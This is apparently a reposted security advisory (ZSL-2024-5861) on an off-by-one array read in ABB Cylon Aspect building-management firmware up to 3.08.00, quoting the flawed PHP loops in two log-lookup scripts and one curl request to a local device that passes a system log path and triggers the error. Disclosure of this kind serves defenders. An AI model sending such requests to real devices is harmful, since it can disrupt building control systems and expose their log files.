@@ -1,0 +1,125 @@
+id: 39801
+date: 11/06/2024
+title: ABB Cylon Aspect 3.08.00 Off-By-One Vulnerability
+author: LiquidWorm
+cves: 
+
+ABB Cylon Aspect 3.08.00 (log(Mix/Yum)Lookup.php) Off-by-One Error in Log Parsing
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb
+Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
+                  Firmware: <=3.08.00
+
+Summary: ASPECT is an award-winning scalable building energy management
+and control solution designed to allow users seamless access to their
+building data through standard building protocols including smart devices.
+
+Desc: A vulnerability was identified in a PHP script where an off-by-one
+error in array access could lead to undefined behavior and potential DoS.
+The issue arises in a loop that iterates over an array using a <= condition,
+allowing access to an out-of-bounds index. This can trigger errors or unexpected
+behavior when processing data, potentially crashing the application. Successful
+exploitation of this vulnerability can lead to a crash or disruption of service,
+especially if the script handles large data sets.
+
+Tested on: GNU/Linux 3.15.10 (armv7l)
+           GNU/Linux 3.10.0 (x86_64)
+           GNU/Linux 2.6.32 (x86_64)
+           Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+           Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+           PHP/7.3.11
+           PHP/5.6.30
+           PHP/5.4.16
+           PHP/4.4.8
+           PHP/5.3.3
+           AspectFT Automation Application Server
+           lighttpd/1.4.32
+           lighttpd/1.4.18
+           Apache/2.2.15 (CentOS)
+           OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64)
+           OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2024-5861
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5861.php
+
+
+21.04.2024
+
+--
+
+
+$ cat project
+
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                                                            
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░                                               
+                                                                                                               
+
+$ cat logYumLookup.php
+...
+...
+    $line = file($logFile);
+    {
+        $x = 0;
+        $data = "";
+        for ($i = 0; $i <= count($line); $i++) { // Off-by-one error
+            $data = $data . $line[$i];           // Potential out-of-bounds access
+            $nextNumber = $i + 1;
+            //need to check to see what the next line starts with so we know to include the next line in this bucket of data or a new bucket.
+
+
+            $arrValues[$x] = $data;
+            $x++;
+            $data = "";
+
+        }
+
+    }
+...
+...
+
+$ cat logMixLookup.php
+...
+...
+        $x = 0;
+        $data = "";
+        for ($i = 0; $i <= count($line); $i++) { Off-by-one error
+            if ((strncmp($line[$i], "INFO", 4) == 0) || (strncmp($line[$i], "DEBUG", 5) == 0) || (strncmp($line[$i], "WARN", 4) == 0) || (strncmp($line[$i], "ERROR", 5) == 0) || (strncmp($line[$i], "FATAL", 5) == 0)) {
+                $logCode = lookupLogOptionValue(substr($line[$i], 0, 5));
+...
+...
+
+$ curl http://192.168.73.31/logMixLookup.php?logFile=/var/log/yum.log
+...
+...
+PHP Warning:  Undefined array key 31337 in /var/log/yum.log on line 1337
+
+#  0day.today [2024-11-07]  #
